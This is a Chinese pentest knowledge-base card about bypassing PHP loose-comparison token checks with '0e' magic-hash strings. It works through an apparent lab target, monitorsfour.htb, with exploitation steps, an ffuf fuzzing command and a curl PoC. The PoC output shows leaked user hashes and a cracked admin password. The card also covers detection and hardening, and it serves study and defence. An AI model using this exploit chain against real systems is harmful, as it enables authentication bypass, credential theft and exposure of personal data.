---
id: web-generic-auth-php-loose-comparison-token-0e-bypass
title: PHP 松散比较 token 绕过：0e 数字串与库中 token 相等，/user 接口泄露全量账号与 PII
type: scenario
domain: web
path: web/generic/auth
technique: php-loose-comparison-token-bypass
tags:
- php
- loose-comparison
- type-juggling
- auth-bypass
- token
- magic-hash
- idor
- pii
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V81
  verified_at: '2026-11-05T18:03:22+08:00'
  notes: 已对照原文与 img03：GET /user?token=0e1234 返回 admin/mwatson/janderson/dthompson 全量记录，字段 id/username/email/password/token/role/name/position/dob/start_date/salary 与卡片一致；库内 token 含 0e543210987654321、0e999999999999999、0e111111111111111，0e 数字串经 == / in_array 松散比较为 0 的说明正确。核对时把“身份证”改为“出生日期”（原文只有 dob，无身份证字段）。未实测目标接口。
url: /docs/web/generic/auth/web-generic-auth-php-loose-comparison-token-0e-bypass/
draft: false
kb_aliases:
- PHP 松散比较绕过
- 0e1234 token
- 0e 魔术哈希
- type juggling token
- token=0e1234
- PHP == 绕过认证
- php_loose_comparison
---

## 一句话结论

PHP 接口 `GET /user?token=<value>` 用松散比较（`==`/`in_array` 未 strict）校验 token 时，提交 `0e1234` 这类“0 的指数形式”数字串会与库中的 `0e543210987654321` 等 token 判等，从而绕过认证并返回全量用户记录（含 admin 的 MD5 口令、明文 token、薪资、出生日期等 PII）。

## 原理

- PHP 的 `==` 在比较两个“数字字符串”时会先转成数字：`"0e1234"` 被解析为 `0 × 10^1234 = 0`，`"0e543210987654321"` 同样为 0，因此 `"0e1234" == "0e543210987654321"` 为 `true`。这就是经典的“0e 魔术哈希/type juggling”。
- 本文数据库中的用户 token 有多个以 `0e` 开头的数字串（`0e543210987654321`、`0e999999999999999`、`0e111111111111111`）；攻击者提交 `token=0e1234` 时，松散比较把双方都当作 0，校验通过。
- 校验通过后，接口没有做数据范围限制，直接返回所有用户对象：`id`、`username`、`email`、`password`（MD5）、`token`、`role`、`name`、`position`、`dob`、`start_date`、`salary`。这使一次认证绕过升级为全量凭据/PII 泄露。
- token 采用 `0e` 开头是为了“看起来像随机数/哈希”，但如果用 `==` 比较，反而落入数字字符串陷阱；根因是“用非严格比较校验安全令牌”，而不是 token 本身可预测。
- 后续利用：MD5 哈希可离线破解（本文 `56b32... -> wonderful1`），admin 口令可登录主站；同一口令在 Cacti 子域复用（`marcus/wonderful1`），把 Web 入口扩展到 Cacti RCE。
- 注意 PHP 版本差异：PHP 8 收紧了“数字与非数字字符串”的比较（`0 == "foo"` 为 false），但两个数字字符串（`"0e1" == "0e2"`）仍按数字比较；此外 `in_array($token, $tokens)` 默认 loose、`strcmp`/`hash_equals` 误用也会产生类似绕过。

## 触发条件

- 认证/查询接口用 PHP `==`、`!=`、`in_array`（未 strict）、`array_search`（未 strict）等松散比较校验 token/验证码/哈希。
- 被比较的一侧是数字字符串（尤其 `0e...`），或攻击者能控制两侧之一。
- 接口在校验通过后返回敏感数据或执行敏感操作。
- 目标 PHP 版本/比较场景仍受 type juggling 影响（数字字符串之间始终受影响）。

## 利用步骤

1. 找到带 token 参数的接口（本文 `GET /user?token=`），先请求自己的合法 token，确认响应结构。
2. 测试 `token=0`、`token=0e1`、`token=0e1234`、`token=0e999` 等；若响应从不合法变为合法（返回用户列表/200），说明存在松散比较。
3. 用 `php_loose_comparison.txt` 等魔术哈希字典 fuzz：
   ```bash
   ffuf -c -u "http://target/user?token=FUZZ" -w php_loose_comparison.txt -fw 4
   ```
4. 拿到全量用户后，提取 MD5 口令与 token；用 hashcat/john 破解 MD5，或直接尝试 token 作为凭据。
5. 用破解出的口令登录主站/子域，检查口令复用；继续枚举其他接口。

## PoC

```bash
curl -s "http://monitorsfour.htb/user?token=0e1234" | jq
```

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "746f9589bc1cf9e590",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "token": "0e543210987654321"
  }
]
```

说明：原文用 `ffuf` + `php_loose_comparison.txt` 发现 `token=0e1234` 返回全部用户，admin MD5 破解为 `wonderful1`；PoC 未在本机复跑，字段已截断/脱敏。

## 变体与关联

- **比较函数变体**：`==`/`!=`、`in_array`/`array_search`（未 strict）、`switch` 松散比较、`strcmp` 返回值判断错误、`md5($x) == $hash`。
- **payload 变体**：`0`、`0e1`、`0e123`、`00`、`0.0`、`+0`；数组注入 `token[]=x` 可使某些比较报错/绕过；`true`/`1` 对布尔比较。
- **影响变体**：token 校验后可能只返回当前用户，也可能返回全量；若用于密码重置/支付/权限判断，影响更大。
- **关联**：[[web-generic-auth-authlog-userid-enumeration-authz-bypass]]（认证后 userId 枚举）、[[web-generic-sqli-mysql-outfile-general-log-webshell]] 不相关；口令复用参见 [[pentest-ad-password-spray-kerberos-reuse-winrm]]。
- **边界**：使用 `===`/`hash_equals`、token 为随机非数字字符串且比较前做类型校验、PHP 版本/框架已修复比较逻辑、或接口另有强认证时，本路径失效。

## 检测与防御

- **检测**：`token` 参数出现 `0e` 开头数字串、纯 `0`、数组/布尔类型；同一 IP 用大量魔术哈希字典请求；异常返回全量用户列表。
- **检测**：接口响应包含 password/token/salary 等敏感字段且非管理员访问；随后出现 MD5 破解与跨系统登录。
- **防御**：所有安全令牌/哈希比较使用 `===` 或 `hash_equals()`；`in_array`/`array_search` 加 `true`；对输入做类型与格式校验（如 token 必须为固定长度十六进制）。
- **加固**：不要把口令哈希、token、薪资等敏感字段返回给前端；接口做对象级授权与最小字段返回；限速与异常枚举告警。
- **响应**：轮换所有泄露 token 与口令、吊销会话、排查跨系统口令复用与后续 RCE。
